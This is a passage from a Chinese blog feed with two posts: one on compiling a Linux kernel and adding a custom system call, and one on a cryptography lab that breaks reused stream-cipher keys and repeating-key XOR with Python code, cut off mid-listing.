class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[admin@localhost ~]$ sudo <span class="hljs-built_in">df</span> -hT<br>[sudo] password <span class="hljs-keyword">for</span> admin: <br>Filesystem              Type      Size  Used Avail Use% Mounted on<br>devtmpfs                devtmpfs  894M     0  894M   0% /dev<br>tmpfs                   tmpfs     910M     0  910M   0% /dev/shm<br>tmpfs                   tmpfs     910M   11M  900M   2% /run<br>tmpfs                   tmpfs     910M     0  910M   0% /sys/fs/cgroup<br>/dev/mapper/centos-root xfs        37G   21G   17G  55% /<br>/dev/sda1               xfs      1014M  313M  702M  31% /boot<br>tmpfs                   tmpfs     182M  4.0K  182M   1% /run/user/42<br>tmpfs                   tmpfs     182M   24K  182M   1% /run/user/1000<br>/dev/sr0                iso9660   8.1G  8.1G     0 100% /run/media/admin/CentOS 7 x86_64<br>tmpfs                   tmpfs     182M     0  182M   0% /run/user/0<br><br></code></pre></td></tr></table></figure><p>可以看出&#x2F;dev&#x2F;mapper&#x2F;centos-root是xfs类型的</p><p>文件扩充：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo xfs_growfs /dev/mapper/centos-root<br></code></pre></td></tr></table></figure><p>至此所有的步骤完成，扩容成功，如果中间出了什么错误，自行百度谷歌即可。</p><h3 id="开始编译"><a href="#开始编译" class="headerlink" title="开始编译"></a>开始编译</h3><p>进入到源码解压的目录下，依次执行如下命令开始内核编译，这可能需要几个小时的时间，可以写一个简单的shell脚本自动执行这些编译指令即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">make bzImage<br>make modules<br>make<br>make modules_install<br>make install<br></code></pre></td></tr></table></figure><p>这里最后一步make install之后我这里报了一个错误：</p><p>dracut[38489]: Failed to install module libnvdimmvmxnet3</p><p>目测是一个模块安装错误，但是重启后发现内核已经编译安装成功了，可以正常使用：</p><p><img src="/images/linux-k5.png"></p><p>图中4.17.11内核就是我们新编译安装的。</p><p>但是，刚才为什么会报错呢？百度毫无疑问无解，我们直接谷歌，发现谷歌上有很多提问，相关内容也不多，于是改变思路，直接搜索未安装成功的libnvdimmvmxnet3模块，然后找到了答案。原来这是vm虚拟机的一个模块，emmmmm突然发现好像自己并没有解决这个问题。。。等我找出来原因在写</p><h2 id="增加一个自定义的系统调用"><a href="#增加一个自定义的系统调用" class="headerlink" title="增加一个自定义的系统调用"></a>增加一个自定义的系统调用</h2><h3 id="1-踩坑合集-4-17-11版本内核勿看"><a href="#1-踩坑合集-4-17-11版本内核勿看" class="headerlink" title="1.踩坑合集(4.17.11版本内核勿看)"></a>1.踩坑合集(4.17.11版本内核勿看)</h3><p><strong>俗话说尽信书则不如无书，照着实验手册来做，忽然发现做出来的有问题，先记录一下这些有问题的</strong></p><h4 id="1-1加系统调用号："><a href="#1-1加系统调用号：" class="headerlink" title="1.1加系统调用号："></a>1.1加系统调用号：</h4><p>先进入源代码根目录，也就是你安装的的内核的目录。在系统调用入口表中增加一项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-built_in">arch</span>/x86/entry/syscalls/<br>vi syscall_64.tbl<br></code></pre></td></tr></table></figure><p>在文件末端增加自己的系统调用函数以及对应的系统调用编号，注意不要覆盖原有的系统调用（333号为本文增加的）</p><p><img src="/images/linux-k6.png"></p><p>这个时候其实已经感觉有点不对了，看看前面的系统调用号，明显和自己加的不一样。</p><h4 id="1-2-声明系统调用函数"><a href="#1-2-声明系统调用函数" class="headerlink" title="1.2 声明系统调用函数"></a>1.2 声明系统调用函数</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> include/linux/<br><br>vi syscalls.h<br></code></pre></td></tr></table></figure><p>在末端加入系统调用函数的声明：</p><p><img src="/images/linux-k7.png"></p><h4 id="1-3实现系统调用函数"><a href="#1-3实现系统调用函数" class="headerlink" title="1.3实现系统调用函数"></a>1.3实现系统调用函数</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi kernel/sys.c<br></code></pre></td></tr></table></figure><p>在文件末端加入对应的实现函数：</p><p><img src="/images/linux-k8.png"></p><h4 id="1-4编译安装内核同上，然后重启系统选择编译好的内核。"><a href="#1-4编译安装内核同上，然后重启系统选择编译好的内核。" class="headerlink" title="1.4编译安装内核同上，然后重启系统选择编译好的内核。"></a>1.4编译安装内核同上，然后重启系统选择编译好的内核。</h4><p>首先编写相应代码测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi mysys.c<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">5</span>;i++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ret = %d\n&quot;</span>,syscall(<span class="hljs-number">333</span>,i));<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译运行后，查看函数是否加入我们的内核：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/kallsyms | grep mysyscall<br></code></pre></td></tr></table></figure><p>结果是：000000000000000     T       sys_mysyscall</p><p>我们可以看到，自己编译的函数成功加入到内核，然后我们执行测试代码，然后用dmesg查看内核输出信息：</p><p><img src="/images/linux-k9.png"></p><p><img src="/images/linux-k10.png"></p><p>可以看出可以调用也正常加入了内核，但是参数明显不对，传参出现了错误！</p><h3 id="2-正确做法（4-17-11版本及以上内核）"><a href="#2-正确做法（4-17-11版本及以上内核）" class="headerlink" title="2.正确做法（4.17.11版本及以上内核）"></a>2.正确做法（4.17.11版本及以上内核）</h3><h4 id="2-1加系统调用号："><a href="#2-1加系统调用号：" class="headerlink" title="2.1加系统调用号："></a>2.1加系统调用号：</h4><p>先进入源代码根目录，在系统调用入口表中增加一项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-built_in">arch</span>/x86/entry/syscalls/<br>vi syscall_64.tbl<br></code></pre></td></tr></table></figure><p>在文件末端增加自己的系统调用函数以及对应的系统调用编号，注意不要覆盖原有的系统调用（333号为本文增加的）</p><p><img src="/images/linux-k11.png"></p><h4 id="2-2-声明系统调用函数"><a href="#2-2-声明系统调用函数" class="headerlink" title="2.2 声明系统调用函数"></a>2.2 声明系统调用函数</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> include/linux/<br><br>vi syscalls.h<br></code></pre></td></tr></table></figure><p>在末端加入系统调用函数的声明：</p><p><img src="/images/linux-k7.png"></p><h4 id="2-3实现系统调用函数"><a href="#2-3实现系统调用函数" class="headerlink" title="2.3实现系统调用函数"></a>2.3实现系统调用函数</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi kernel/sys.c<br></code></pre></td></tr></table></figure><p>在文件末端加入对应的实现函数：</p><p><img src="/images/linux-k12.png"></p><h4 id="2-4编译安装内核同上，然后重启系统选择编译好的内核。"><a href="#2-4编译安装内核同上，然后重启系统选择编译好的内核。" class="headerlink" title="2.4编译安装内核同上，然后重启系统选择编译好的内核。"></a>2.4编译安装内核同上，然后重启系统选择编译好的内核。</h4><p>首先编写相应代码测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi mysys.c<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">5</span>;i++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ret = %d\n&quot;</span>,syscall(<span class="hljs-number">333</span>,i));<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译运行后，查看函数是否加入我们的内核：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/kallsyms | grep mysyscall<br></code></pre></td></tr></table></figure><p>结果是：000000000000000     T       sys_mysyscall</p><p>我们可以看到，自己编译的函数成功加入到内核，然后我们执行测试代码，然后用dmesg查看内核输出信息：</p><p><img src="/images/linux-k9.png"></p><p><img src="/images/linux-k13.png"></p><p>至此问题解决，成功增加了一个自己的系统调用!</p><p>欢迎大家批评指正！</p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学实验一</title>
    <link href="/blog/2019/10/20/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C%E4%B8%80/"/>
    <url>/blog/2019/10/20/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<p>密码学实验一做完了，写篇博客总结一下。</p><p><img src="/images/fj22.jpg"></p><span id="more"></span><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><strong>1.让我们看看流密码多次使用时出了什么问题。以下是十一个十六进制编码的密文，这些密文是使用流密文加密所有十一个具有相同流密文密钥的明文的结果。目标是解密最后的密文。提示：对密文进行异或运算，并考虑将空格与[a-zA-Z]中的字符进行异或运算时会发生什么。</strong><br><strong>2.编写一个程序破解一个类似于维吉尼亚密码加密的字符串，与维吉尼亚不同的是该加密方案使用的是字节异或而不是模26。</strong><br><strong>3.加密挑战赛</strong><br>3.1将十六进制转换为base64<br>3.2两个十六进制表示的字符串的异或<br>3.3解密经过一个字符异或加密后的数据，采用累计得分的方式<br>3.4 3.3的加强版，在n行的文件中找出经过一个字符异或加密的一行，并给出明文<br>3.5 使用“ICE”三个字母采用重复的密钥异或的方式加密两个字符串<br>3.6解密通过重复密钥异或加密后并且经过base64处理的数据<br><strong>4.通过社会工程学，猜测用户口令，破解SHA1处理后的字符串</strong></p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a><strong>过程</strong></h2><h3 id="1-流密码多次使用"><a href="#1-流密码多次使用" class="headerlink" title="1.流密码多次使用"></a>1.流密码多次使用</h3><p>[A-Z]用[0x41-0x5a]表示。相应地，[a-z]用[0x61-0x7a]表示。而空格，则用0x20表示，也就是表格中的SP。空格这个表示带来了一个很巧妙的转换：如果一个大写字母与空格与或，那么结果为一个对应的小写字母；如果一个小写字母与空格与或，那么结果为一个对应的大写字母！举两个例子：   a ^ SP &#x3D; 01100001 ^ 00100000 &#x3D; 01000001 &#x3D;   A   A ^ SP &#x3D; a ^ SP ^ SP &#x3D; a   同时，解密过程中也用到了xor的另一个性质：对于一个数，连续与或两次任意相同的数，其结果与原数相同。用公式表示就是，对于任意的x和y：   x ^ y ^ y &#x3D; x   根据提示，每一个ciphertext都是用相同的streamcipher加密的。因此，假设plaintext分别为m1、m2，那么c1 &#x3D; m1 ^   k， c2 &#x3D; m2 ^ k，于是c1 ^ c2&#x3D; m1   ^ k ^ m2 ^ k &#x3D; m1 ^ m2。这样我们就把k消去，只剩下了m1和m2。   那么，我们的解法就很显然了：随便找任意给定的m_i，m_j相与或，如果发现了有意义的英文字母，那么对应位上很可能一个是空格，另一个是英文字母 </p><p>代码运行结果如下图：</p><p><img src="/images/crypto1-1.png"></p><h3 id="2-维吉尼亚密码破解"><a href="#2-维吉尼亚密码破解" class="headerlink" title="2.维吉尼亚密码破解"></a>2.维吉尼亚密码破解</h3><p>首先我们要确定密钥的长度，从0-255循环遍历，查看哪个长度对应的可见字符数量最多。   从图中可以看出，当keysize&#x3D;7的时候有解的可能性最大 :</p><p><img src="/images/crypto1-2.png"></p><p>于是我们可以猜测密钥长度就是7，接下来我们猜测具体的密钥，从0-255循环与密文异或，如果是大小写字母或者空格逗号之类的，那么就计数+1，找到可以解密所有的字符的口令后返回：</p><p><img src="/images/crypto1-3.png"></p><p>最后发现密钥就是：[[186], [31], [145], [178], [83], [205], [62]]   然后用密钥解密原文就得到了明文： </p><p><img src="/images/crypto1-4.png"></p><h3 id="3-加密挑战赛"><a href="#3-加密挑战赛" class="headerlink" title="3.加密挑战赛"></a>3.加密挑战赛</h3><h4 id="3-1将16进制字符串转化为base64"><a href="#3-1将16进制字符串转化为base64" class="headerlink" title="3.1将16进制字符串转化为base64"></a>3.1将16进制字符串转化为base64</h4><p>代码很简单，调用相关函数即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hexToBase64</span>(<span class="hljs-params">s</span>):<br>    decoded = binascii.unhexlify(s)<br>    <span class="hljs-keyword">return</span> base64.b64encode(decoded).decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br><br>x = <span class="hljs-string">&#x27;49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d&#x27;</span><br>expectedY = <span class="hljs-string">&#x27;SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t&#x27;</span><br>y = hexToBase64(x)<br><span class="hljs-built_in">print</span>(y)<br><span class="hljs-built_in">print</span>(expectedY)<br><br><br></code></pre></td></tr></table></figure><p>结果如下：</p><p>SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t<br>SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t</p><h4 id="3-2十六进制表示的字符串的异或"><a href="#3-2十六进制表示的字符串的异或" class="headerlink" title="3.2十六进制表示的字符串的异或"></a>3.2十六进制表示的字符串的异或</h4><p>先将十六进制字符串转换成字符串，然后调用strxor函数即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor<br><br>encodedS = <span class="hljs-string">&#x27;1c0111001f010100061a024b53535009181c&#x27;</span><br>encodedT = <span class="hljs-string">&#x27;686974207468652062756c6c277320657965&#x27;</span><br>encodedExpectedU = <span class="hljs-string">&#x27;746865206b696420646f6e277420706c6179&#x27;</span><br><br>s = binascii.unhexlify(encodedS)<br>t = binascii.unhexlify(encodedT)<br>expectedU = binascii.unhexlify(encodedExpectedU)<br><br>u = strxor(s, t)<br><span class="hljs-built_in">print</span>(u)<br><span class="hljs-built_in">print</span>(expectedU)<br></code></pre></td></tr></table></figure><p>运行结果：</p><p>b”the kid don’t play”<br>b”the kid don’t play”</p><h4 id="3-3解密经过一个字符异或加密后的数据，采用累计得分的方式"><a href="#3-3解密经过一个字符异或加密后的数据，采用累计得分的方式" class="headerlink" title="3.3解密经过一个字符异或加密后的数据，采用累计得分的方式"></a>3.3解密经过一个字符异或加密后的数据，采用累计得分的方式</h4><p>首先查找一下英文词频，以便于后面的赋值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python">freqs = &#123;<br>    <span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-number">0.0651738</span>,<br>    <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">0.0124248</span>,<br>    <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">0.0217339</span>,<br>    <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-number">0.0349835</span>,<br>    <span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-number">0.1041442</span>,<br>    <span class="hljs-string">&#x27;f&#x27;</span>: <span class="hljs-number">0.0197881</span>,<br>    <span class="hljs-string">&#x27;g&#x27;</span>: <span class="hljs-number">0.0158610</span>,<br>    <span class="hljs-string">&#x27;h&#x27;</span>: <span class="hljs-number">0.0492888</span>,<br>    <span class="hljs-string">&#x27;i&#x27;</span>: <span class="hljs-number">0.0558094</span>,<br>    <span class="hljs-string">&#x27;j&#x27;</span>: <span class="hljs-number">0.0009033</span>,<br>    <span class="hljs-string">&#x27;k&#x27;</span>: <span class="hljs-number">0.0050529</span>,<br>    <span class="hljs-string">&#x27;l&#x27;</span>: <span class="hljs-number">0.0331490</span>,<br>    <span class="hljs-string">&#x27;m&#x27;</span>: <span class="hljs-number">0.0202124</span>,<br>    <span class="hljs-string">&#x27;n&#x27;</span>: <span class="hljs-number">0.0564513</span>,<br>    <span class="hljs-string">&#x27;o&#x27;</span>: <span class="hljs-number">0.0596302</span>,<br>    <span class="hljs-string">&#x27;p&#x27;</span>: <span class="hljs-number">0.0137645</span>,<br>    <span class="hljs-string">&#x27;q&#x27;</span>: <span class="hljs-number">0.0008606</span>,<br>    <span class="hljs-string">&#x27;r&#x27;</span>: <span class="hljs-number">0.0497563</span>,<br>    <span class="hljs-string">&#x27;s&#x27;</span>: <span class="hljs-number">0.0515760</span>,<br>    <span class="hljs-string">&#x27;t&#x27;</span>: <span class="hljs-number">0.0729357</span>,<br>    <span class="hljs-string">&#x27;u&#x27;</span>: <span class="hljs-number">0.0225134</span>,<br>    <span class="hljs-string">&#x27;v&#x27;</span>: <span class="hljs-number">0.0082903</span>,<br>    <span class="hljs-string">&#x27;w&#x27;</span>: <span class="hljs-number">0.0171272</span>,<br>    <span class="hljs-string">&#x27;x&#x27;</span>: <span class="hljs-number">0.0013692</span>,<br>    <span class="hljs-string">&#x27;y&#x27;</span>: <span class="hljs-number">0.0145984</span>,<br>    <span class="hljs-string">&#x27;z&#x27;</span>: <span class="hljs-number">0.0007836</span>,<br>    <span class="hljs-string">&#x27; &#x27;</span>: <span class="hljs-number">0.1918182</span> <br>&#125;<br></code></pre></td></tr></table></figure><p>然后编写赋分函数，这里大写字母全部映射到小写计算：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">scoring</span>(<span class="hljs-params">s</span>):<br>    score = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        c = <span class="hljs-built_in">chr</span>(i).lower()<br>        <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> freqs:<br>            score += freqs[c]<br>    <span class="hljs-keyword">return</span> score<br><br></code></pre></td></tr></table></figure><p>   剩下的就是从0-255试密钥了，将得分值最高的密钥返回，认定为最有可能的密钥   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">breakSingleByteXOR</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">key</span>(<span class="hljs-params">p</span>):<br>        <span class="hljs-comment">#print(p)</span><br>        <span class="hljs-keyword">return</span> scoring(p[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>([(i, strxor_c(s, i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>)], key=key)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    encodedS = <span class="hljs-string">&#x27;1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736&#x27;</span><br>    s = binascii.unhexlify(encodedS)<br>    <span class="hljs-built_in">print</span>(breakSingleByteXOR(s))<br></code></pre></td></tr></table></figure><p>最后的解密结果就是：</p><p>(88, b”Cooking MC’s like a pound of bacon”)</p><p>密钥就是88，明文是 Cooking MC’s like a pound of bacon</p><h4 id="3-4-3-3的加强版，在文件中找出经过一个字符异或加密的一行，并给出明文"><a href="#3-4-3-3的加强版，在文件中找出经过一个字符异或加密的一行，并给出明文" class="headerlink" title="3.4 3.3的加强版，在文件中找出经过一个字符异或加密的一行，并给出明文"></a>3.4 3.3的加强版，在文件中找出经过一个字符异或加密的一行，并给出明文</h4><p>这题和上面那题一样，只不过从一行变成n行而已，我们只需将上面那题循环n次即可，找出n行中得分最高的一行和对应的密钥即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> challenge3<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decodeLines</span>(<span class="hljs-params">filename</span>):<br>    f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-keyword">if</span> line[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;\n&#x27;</span>:<br>            line = line[:-<span class="hljs-number">1</span>]<br>        s = binascii.unhexlify(line)<br>        <span class="hljs-keyword">yield</span> s<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">findSingleByteXOR</span>(<span class="hljs-params">lines</span>):<br>    brokenLines = [challenge3.breakSingleByteXOR(l)[<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> lines]<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">scoring</span>(<span class="hljs-params">i</span>):<br>        <span class="hljs-keyword">return</span> challenge3.scoring(brokenLines[i])<br>    maxI = <span class="hljs-built_in">max</span>(<span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(brokenLines)), key=scoring)<br>    <span class="hljs-keyword">return</span> (maxI+<span class="hljs-number">1</span>, brokenLines[maxI])<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(findSingleByteXOR(decodeLines(<span class="hljs-string">&#x27;challenge4.txt&#x27;</span>)))<br></code></pre></td></tr></table></figure><p>结果如下：</p><p>(171, b’Now that the party is jumping\n’)</p><p>第171行是经过单字符加密的口令，解密结果就是Now that the party is jumping</p><h4 id="3-5使用“ICE”三个字母采用重复的密钥异或的方式加密两个字符串"><a href="#3-5使用“ICE”三个字母采用重复的密钥异或的方式加密两个字符串" class="headerlink" title="3.5使用“ICE”三个字母采用重复的密钥异或的方式加密两个字符串"></a>3.5使用“ICE”三个字母采用重复的密钥异或的方式加密两个字符串</h4><p>无非是密钥个数从一变为三了，取余3字节异或即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encodeRepeatingKeyXor</span>(<span class="hljs-params">s, key</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([s[i] ^ key[i % <span class="hljs-built_in">len</span>(key)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s))])<br><br>x = <span class="hljs-string">b&#x27;&#x27;&#x27;Burning &#x27;em, if you ain&#x27;t quick and nimble</span><br><span class="hljs-string">I go crazy when I hear a cymbal&#x27;&#x27;&#x27;</span><br>key = <span class="hljs-string">b&#x27;ICE&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    y = encodeRepeatingKeyXor(x, key)<br>    encodedY = binascii.hexlify(y).decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(encodedY)<br></code></pre></td></tr></table></figure><p>结果如下：</p><p>0b3637272a2b2e63622c2e69692a23693a2a3c6324202d623d63343c2a26226324272765272a282b2f20430a652e2c652a3124333a653e2b2027630c692b20283165286326302e27282f</p><h4 id="3-6解密通过重复密钥异或加密后并且经过base64处理的数据"><a href="#3-6解密通过重复密钥异或加密后并且经过base64处理的数据" class="headerlink" title="3.6解密通过重复密钥异或加密后并且经过base64处理的数据"></a>3.6解密通过重复密钥异或加密后并且经过base64处理的数据</h4><p>步骤题目中已经给出，按照题目给的步骤一步一步来做即可<br>首先确定 KEYSIZE 也就是密钥长度，题目中说的是密钥长度在2-40之间，这里提一个汉明距离的概念，就是不同比特的数量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getHammingDistance</span>(<span class="hljs-params">x, y</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>([<span class="hljs-built_in">bin</span>(x[i] ^ y[i]).count(<span class="hljs-string">&#x27;1&#x27;</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span 